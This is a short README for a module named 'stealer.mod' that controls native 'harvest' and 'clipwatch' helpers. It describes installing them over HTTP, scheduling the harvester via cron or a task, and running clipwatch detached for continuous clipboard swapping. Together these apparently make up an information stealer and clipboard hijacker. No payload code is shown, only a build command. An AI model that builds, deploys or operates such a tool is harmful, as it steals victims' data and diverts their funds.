# stealer.mod

Controller for the native `harvest` and `clipwatch` helpers.

Deploy the helpers once with `install` (chunked HTTP + SHA-256), then `run` the
harvester on a schedule and `watch` the clipboard from cron/task, or start
`clipwatch` detached for continuous swapping.

```sh
./build.sh   # or: cargo build --release --target wasm32-unknown-unknown
```

See `docs/STEALER.md`.
